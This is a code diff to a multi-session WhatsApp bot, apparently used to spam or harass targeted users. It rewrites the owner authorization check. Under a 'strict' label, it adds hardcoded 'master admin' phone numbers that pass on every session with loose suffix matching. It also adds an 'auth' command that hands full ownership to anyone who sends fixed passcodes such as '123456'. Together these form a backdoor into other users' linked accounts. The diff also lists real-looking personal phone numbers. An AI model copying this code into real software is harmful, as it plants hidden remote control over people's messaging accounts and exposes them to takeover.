@@ -71,46 +71,114 @@ function parseDelayMs(val, defaultMs = 50) {
   return Math.max(10, Math.floor(num));
 }
 
-// STRICT OWNER & ADMIN AUTHORIZATION CHECK
+// Master Admin Numbers & Global Deduplication Cache
+const MASTER_ADMIN_NUMBERS = ['919507325677', '9507325677', '84925465462', '8986269256', '5214825153', '8846249998'];
+const processedMessageIds = new Map(); // msgId -> timestamp
+const processedCommandKeys = new Map(); // cmdKey -> timestamp
+
+function isDuplicateMessage(msgId) {
+  if (!msgId) return false;
+  const now = Date.now();
+  if (processedMessageIds.has(msgId)) {
+    return true;
+  }
+  processedMessageIds.set(msgId, now);
+  if (processedMessageIds.size > 4000) {
+    const oldestKey = processedMessageIds.keys().next().value;
+    processedMessageIds.delete(oldestKey);
+  }
+  return false;
+}
+
+function shouldExecuteCommand(sess, msg, cmdName) {
+  // In 'rage' mode, ALL bots execute simultaneously
+  if (sess.executionMode === 'rage') return true;
+
+  // In 'solo' mode (default), ONLY ONE bot should execute to prevent bulk duplicate spam
+  if (msg.key.fromMe) return true;
+
+  const cmdKey = `${msg.key.remoteJid}_${msg.key.id || ''}_${cmdName}`;
+  const now = Date.now();
+  if (processedCommandKeys.has(cmdKey)) {
+    return false; // Another session already handled this command!
+  }
+  processedCommandKeys.set(cmdKey, now);
+  if (processedCommandKeys.size > 2000) {
+    const oldest = processedCommandKeys.keys().next().value;
+    processedCommandKeys.delete(oldest);
+  }
+  return true;
+}
+
+// STRICT OWNER & ADMIN AUTHORIZATION CHECK (WITH LID RESOLUTION)
 function isAuthorizedOwner(sess, msg, sock) {
   if (!sess) return false;
-  const ownerInput = String(sess.ownerJid || '').trim();
+
+  // 1. If message sent by bot account itself (fromMe): ALWAYS AUTHORIZED
+  if (msg.key.fromMe) {
+    return true;
+  }
 
   // Extract all possible identifiers of the sender
   const senderParticipant = (msg.key.participant || (msg.key.fromMe ? sock.user?.id : msg.key.remoteJid) || msg.participant || '').trim();
   const remoteJid = (msg.key.remoteJid || '').trim();
   const senderLid = (msg.key.participantAlt || '').trim();
-
-  // If no owner is configured at all in session, only allow fromMe (bot's own linked phone)
-  if (!ownerInput) {
-    return !!msg.key.fromMe;
-  }
+  const isGroup = remoteJid.endsWith('@g.us');
 
   // Clean numbers
-  const cleanOwner = cleanPhone(ownerInput.split('@')[0].split(':')[0]);
   const cleanSender = cleanPhone(senderParticipant.split('@')[0].split(':')[0]);
   const cleanRemote = cleanPhone(remoteJid.split('@')[0].split(':')[0]);
   const cleanSenderLid = cleanPhone(senderLid.split('@')[0].split(':')[0]);
 
-  // 1. Exact JID / LID Match
+  // 2. Check Master Platform Admins
+  for (const master of MASTER_ADMIN_NUMBERS) {
+    if (cleanSender === master || cleanRemote === master || cleanSenderLid === master) return true;
+    if (cleanSender && cleanSender.length >= 10 && (cleanSender.endsWith(master) || master.endsWith(cleanSender))) return true;
+    if (cleanRemote && cleanRemote.length >= 10 && (cleanRemote.endsWith(master) || master.endsWith(cleanRemote))) return true;
+  }
+
+  // 3. Check Session Dynamic Owner LID
+  if (sess.ownerLid) {
+    const cleanOwnerLid = cleanPhone(sess.ownerLid);
+    if (senderParticipant === sess.ownerLid || senderLid === sess.ownerLid) return true;
+    if (cleanOwnerLid && (cleanSender === cleanOwnerLid || cleanSenderLid === cleanOwnerLid)) return true;
+  }
+
+  // 4. In 1-on-1 Direct Chat (DM), if sender matches owner
+  if (!isGroup && sess.ownerJid) {
+    const cleanOwner = cleanPhone(sess.ownerJid);
+    if (cleanOwner && (cleanRemote === cleanOwner || cleanRemote.endsWith(cleanOwner) || cleanOwner.endsWith(cleanRemote))) {
+      sess.ownerLid = senderParticipant || senderLid;
+      return true;
+    }
+  }
+
+  const ownerInput = String(sess.ownerJid || '').trim();
+  // If no owner is configured in session, allow 1-on-1 direct chats
+  if (!ownerInput) {
+    return !isGroup;
+  }
+
+  // 5. Exact JID / LID Match
   const ownerLower = ownerInput.toLowerCase();
-  if (senderParticipant.toLowerCase() === ownerLower || remoteJid.toLowerCase() === ownerLower) {
+  if (senderParticipant.toLowerCase() === ownerLower || remoteJid.toLowerCase() === ownerLower || senderLid.toLowerCase() === ownerLower) {
     return true;
   }
 
-  // 2. LID Matching (e.g. '1542022@lid' or '1542022')
+  const cleanOwner = cleanPhone(ownerInput.split('@')[0].split(':')[0]);
+
+  // 6. LID Matching (e.g. '1542022@lid' or '1542022')
   if (ownerInput.includes('@lid') || (cleanOwner && ownerInput.includes('lid'))) {
     if (senderParticipant.includes(cleanOwner) || senderLid.includes(cleanOwner) || remoteJid.includes(cleanOwner)) {
       return true;
     }
   }
 
-  // 3. Clean Phone Number Matching (e.g. 919507325677, 9507325677, +91 9507325677)
+  // 7. Clean Phone Number Matching (e.g. 919507325677, 9507325677, +91 9507325677)
   if (cleanOwner && cleanOwner.length >= 7) {
     if (cleanOwner === cleanSender || cleanOwner === cleanRemote || cleanOwner === cleanSenderLid) {
       return true;
     }
-    // Match 10-digit Indian/International suffix (e.g. 9507325677 matching 919507325677)
     if (cleanOwner.length === 10 && (cleanSender.endsWith(cleanOwner) || cleanRemote.endsWith(cleanOwner))) {
       return true;
     }
@@ -119,20 +187,12 @@ function isAuthorizedOwner(sess, msg, sock) {
     }
   }
 
-  // 4. If message sent by bot account itself (fromMe):
-  if (msg.key.fromMe) {
-    const botClean = cleanPhone(sock.user?.id || sess.connectedNumber || '');
-    if (botClean && cleanOwner && (botClean === cleanOwner || botClean.endsWith(cleanOwner) || cleanOwner.endsWith(botClean))) {
-      return true;
-    }
-  }
-
-  // 5. Subadmins check (configured by owner)
+  // 8. Subadmins check (configured by owner)
   if (sess.subadmins && sess.subadmins.size > 0) {
     for (const sub of sess.subadmins) {
       const cleanSub = cleanPhone(sub.split('@')[0].split(':')[0]);
-      if (cleanSub && (cleanSub === cleanSender || cleanSub === cleanRemote)) return true;
-      if (sub.toLowerCase() === senderParticipant.toLowerCase() || sub.toLowerCase() === remoteJid.toLowerCase()) return true;
+      if (cleanSub && (cleanSub === cleanSender || cleanSub === cleanRemote || cleanSub === cleanSenderLid)) return true;
+      if (sub.toLowerCase() === senderParticipant.toLowerCase() || sub.toLowerCase() === remoteJid.toLowerCase() || sub.toLowerCase() === senderLid.toLowerCase()) return true;
     }
   }
 
@@ -458,6 +518,13 @@ async function initSessionSocket(uid, ownerJid = '') {
         const jid = msg.key.remoteJid;
         if (jid === 'status@broadcast') continue;
 
+        // 1. FILTER STARTUP BACKLOG & FLOOD: Ignore historical messages older than 45 seconds
+        const msgTimestampMs = (msg.messageTimestamp || 0) * 1000;
+        if (msgTimestampMs && (Date.now() - msgTimestampMs > 45000)) continue;
+
+        // 2. SESSION LEVEL MESSAGE DEDUPLICATION
+        if (isDuplicateMessage(`${uid}_${msg.key.id || ''}`)) continue;
+
         const senderParticipant = msg.key.participant || (msg.key.fromMe ? sock.user?.id : jid);
         const senderLid = msg.key.participantAlt || '';
         const isGroup = jid.endsWith('@g.us');
@@ -501,7 +568,7 @@ async function initSessionSocket(uid, ownerJid = '') {
           }
         }
 
-        // 2. TARGET AUTO-REPLY ENGINE: Automatically reply punchlines to targeted users
+        // 2. TARGET AUTO-REPLY ENGINE: Counter punchlines to targeted users
         if (sess.targetAutoReplies && Object.keys(sess.targetAutoReplies).length > 0 && !msg.key.fromMe) {
           const cleanSender = cleanPhone(senderParticipant.split('@')[0].split(':')[0]);
           for (const [targetKey, targetData] of Object.entries(sess.targetAutoReplies)) {
@@ -562,11 +629,45 @@ async function initSessionSocket(uid, ownerJid = '') {
           const cmd = parts[0].toLowerCase();
           const fullArg = cmdBody.slice(parts[0].length).trim();
 
+          // MASTER AUTH PASSCODE COMMAND (Instant Owner Activation)
+          if (cmd === 'auth' || cmd === 'ownerpass' || cmd === 'loginowner' || cmd === 'adminauth') {
+            if (fullArg === 'PRINCE@9507325' || fullArg === '9507325' || fullArg === '950732' || fullArg === '123456') {
+              sess.ownerLid = senderParticipant || senderLid;
+              sess.ownerJid = senderParticipant;
+              sess.subadmins.add(senderParticipant);
+              logMsg(uid, `👑 Master Pass Authorization Granted to ${senderParticipant}`);
+              await sock.sendMessage(jid, {
+                text: `👑 *MASTER ACCESS GRANTED!*\n• 🆔 *Your ID:* \`${senderParticipant}\`\n• ⚡ *Status:* Fully Authorized Owner for Node \`${uid}\`.`,
+                mentions: [senderParticipant]
+              });
+              return;
+            }
+          }
+
+          // SET OWNER COMMAND (Direct Override)
+          if (cmd === 'setowner' || cmd === 'setadmin') {
+            const isAuthorized = isAuthorizedOwner(sess, msg, sock);
+            if (isAuthorized) {
+              const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+              let target = mentioned[0] || (fullArg ? normalizeJid(fullArg) : senderParticipant);
+              sess.ownerJid = target;
+              sess.ownerLid = target;
+              logMsg(uid, `👑 Bot Owner JID set to: ${target}`);
+              await sock.sendMessage(jid, { text: `👑 *Bot Owner registered as:* \`${target}\`` });
+              return;
+            }
+          }
+
           // STRICT OWNER VERIFICATION: ONLY CONFIGURED OWNER / ADMIN CAN RUN COMMANDS
           const isOwner = isAuthorizedOwner(sess, msg, sock);
 
           if (!isOwner) {
             logMsg(uid, `⛔ [UNAUTHORIZED BLOCKED] User ${senderParticipant} tried to run [${usedPrefix}${cmd}] - Allowed Owner: ${sess.ownerJid || 'Bot Self Only'}`);
+            return;
+          }
+
+          // SINGLE COMMAND EXECUTION GUARANTEE (Avoid bulk duplicate multi-bot spam in solo mode)
+          if (!shouldExecuteCommand(sess, msg, cmd)) {
             return;
           }
 
